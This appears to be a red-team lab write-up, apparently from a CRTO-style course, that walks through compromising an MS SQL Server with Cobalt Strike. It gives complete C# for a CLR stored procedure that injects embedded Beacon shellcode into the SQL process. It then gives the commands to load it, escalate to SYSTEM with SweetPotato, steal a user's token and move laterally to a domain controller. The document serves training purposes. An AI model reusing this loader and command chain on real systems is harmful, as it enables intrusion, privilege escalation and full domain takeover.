## SQL CLR Exectuion

1. Enable SQL CLR

```powershell
sql-enableclr dub-sql-1
```

Enabling CLR opens a practical route from database administration into code execution inside the SQL Server process.

2. Open Visual Studio and create a new `class library (.NET Framework)` project, give it a name (`MyProcedure`), and check `Place solution and project in the same directory`

#### Step 1 — Create the project

![Evidencia del laboratorio: captura revisada](/images/labs/crto-lab/imagen1.png)

#### Step 2 — Keep the solution and project together

![Evidencia del laboratorio: captura revisada](/images/labs/crto-lab/imagen2.png)

#### Step 3 — Add smb_x64.xthread.bin to the project

![Evidencia del laboratorio: captura revisada](/images/labs/crto-lab/imagen3.png)

#### Step 4 — Mark it as an embedded resource

![Evidencia del laboratorio: captura revisada](/images/labs/crto-lab/imagen4.png)


3. Place the following code 

then > change from `Build` to `Release` then > `Build` > `Build Solution`

```cpp
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.SqlServer.Server;

public partial class StoredProcedures
{
    [SqlProcedure]
    public static void MyProcedure()
    {
        var assembly = Assembly.GetExecutingAssembly();

        byte[] shellcode;

        // read embedded payload
        using (var rs = assembly.GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin"))
        {
            using (var ms = new MemoryStream())
            {
                rs.CopyTo(ms);
                shellcode = ms.ToArray();
            }
        }

        // allocate memory
        var hMemory = VirtualAlloc(
            IntPtr.Zero,
            (uint)shellcode.Length,
            VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
            PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

        // copy shellcode
        WriteProcessMemory(
            new IntPtr(-1),
            hMemory,
            shellcode,
            (uint)shellcode.Length,
            out _);

        // create thread
        var hThread = CreateThread(
            IntPtr.Zero,
            0,
            hMemory,
            IntPtr.Zero,
            THREAD_CREATION_FLAGS.THREAD_CREATE_RUN_IMMEDIATELY,
            out _);

        // close thread handle
        CloseHandle(hThread);
    }

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        VIRTUAL_ALLOCATION_TYPE flAllocationType,
        PAGE_PROTECTION_FLAGS flProtect);

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out uint lpNumberOfBytesWritten);

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        THREAD_CREATION_FLAGS dwCreationFlags,
        out uint lpThreadId);

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern bool CloseHandle(IntPtr hObject);

    [Flags]
    public enum VIRTUAL_ALLOCATION_TYPE : uint
    {
        MEM_COMMIT = 0x00001000,
        MEM_RESERVE = 0x00002000,
        MEM_RESET = 0x00080000,
        MEM_RESET_UNDO = 0x01000000,
        MEM_REPLACE_PLACEHOLDER = 0x00004000,
        MEM_LARGE_PAGES = 0x20000000,
        MEM_RESERVE_PLACEHOLDER = 0x00040000,
        MEM_FREE = 0x00010000,
    }

    [Flags]
    public enum PAGE_PROTECTION_FLAGS : uint
    {
        PAGE_NOACCESS = 0x00000001,
        PAGE_READONLY = 0x00000002,
        PAGE_READWRITE = 0x00000004,
        PAGE_WRITECOPY = 0x00000008,
        PAGE_EXECUTE = 0x00000010,
        PAGE_EXECUTE_READ = 0x00000020,
        PAGE_EXECUTE_READWRITE = 0x00000040,
        PAGE_EXECUTE_WRITECOPY = 0x00000080,
        PAGE_GUARD = 0x00000100,
        PAGE_NOCACHE = 0x00000200,
        PAGE_WRITECOMBINE = 0x00000400,
        PAGE_GRAPHICS_NOACCESS = 0x00000800,
        PAGE_GRAPHICS_READONLY = 0x00001000,
        PAGE_GRAPHICS_READWRITE = 0x00002000,
        PAGE_GRAPHICS_EXECUTE = 0x00004000,
        PAGE_GRAPHICS_EXECUTE_READ = 0x00008000,
        PAGE_GRAPHICS_EXECUTE_READWRITE = 0x00010000,
        PAGE_GRAPHICS_COHERENT = 0x00020000,
        PAGE_GRAPHICS_NOCACHE = 0x00040000,
        PAGE_ENCLAVE_THREAD_CONTROL = 0x80000000,
        PAGE_REVERT_TO_FILE_MAP = 0x80000000,
        PAGE_TARGETS_NO_UPDATE = 0x40000000,
        PAGE_TARGETS_INVALID = 0x40000000,
        PAGE_ENCLAVE_UNVALIDATED = 0x20000000,
        PAGE_ENCLAVE_MASK = 0x10000000,
        PAGE_ENCLAVE_DECOMMIT = 0x10000000,
        PAGE_ENCLAVE_SS_FIRST = 0x10000001,
        PAGE_ENCLAVE_SS_REST = 0x10000002,
        SEC_PARTITION_OWNER_HANDLE = 0x00040000,
        SEC_64K_PAGES = 0x00080000,
        SEC_FILE = 0x00800000,
        SEC_IMAGE = 0x01000000,
        SEC_PROTECTED_IMAGE = 0x02000000,
        SEC_RESERVE = 0x04000000,
        SEC_COMMIT = 0x08000000,
        SEC_NOCACHE = 0x10000000,
        SEC_WRITECOMBINE = 0x40000000,
        SEC_LARGE_PAGES = 0x80000000,
        SEC_IMAGE_NO_EXECUTE = 0x11000000,
    }

    [Flags]
    public enum THREAD_CREATION_FLAGS : uint
    {
        THREAD_CREATE_RUN_IMMEDIATELY = 0x00000000,
        THREAD_CREATE_SUSPENDED = 0x00000004,
        STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000,
    }
}
```

> This will perform a classic injection where the Beacon will execute within the MS SQL process.

4. Executin the custom assembly

```powershell
sql-clr dub-sql-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
```

Operationally, the command:

- uploads the assembly
- registers it as a custom stored procedure
- executes the procedure entry point
- cleans up after execution

The important result is not the SQL output itself. The important result is that code now runs inside the SQL Server process.

5. Linking the beacon

```powershell
link dub-sql-1 CoreFxPipe-47291f3c-ae21-4c8b-9d12-6f8b0a1e5c77
```

The Beacon does NOT appear automatically in the Cobalt Strike interface. The `link` command is essential for the C2 to recognize and manage that new agent in the interface. 

> If you do not run `link`, the remote Beacon remains "orphaned" and you will not have direct control from Cobalt Strike, even though the payload executes

## SQL Privilege Escalation

Once access to SQL Server has been obtained under the `DUBLIN\iappleton` context with `sysadmin` privileges, the next objective is to break the SQL boundary and convert that access into operating-system-level execution with `SYSTEM` privileges.

The idea here is not simply to “execute something from SQL,” but to turn logical control over the service into full control of the host. In this scenario, the SQL service runs with enough privileges to enable local escalation through service privilege abuse.

```powershell
# Change the Beacon working directory and upload the payload
cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
upload C:\Payloads\tcp-local_x64.exe

# Execute SweetPotato pointing to your payload
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"

# Connect to your new Beacon/SHELL with SYSTEM privileges
connect localhost 1337
```

Abusing SQL service privileges allows execution as `SYSTEM` on `dub-sql-1`, completely breaking the separation between database access and operating system control.

Operational value:

- You move from SQL `sysadmin` to full host control
- Token theft, memory access, and local pivoting become possible
- The SQL host stops being just an application target and becomes a post-exploitation node

#### Pivot toward dub-dc-1

With `SYSTEM` on the SQL server, the goal is no longer persistence on the same host, but using the privileged context to identify high-value sessions and pivot toward the domain controller.

```powershell
ps
steal_token PID_EXPLORER_NWALLACE
ls \\dub-dc-1\c$
jump scshell64 dub-dc-1 smb
```

An active `nwallace` session is identified, its token is stolen, and administrative access to `dub-dc-1` is validated over SMB.

> Compromise of the `dub-dc-1` domain controller
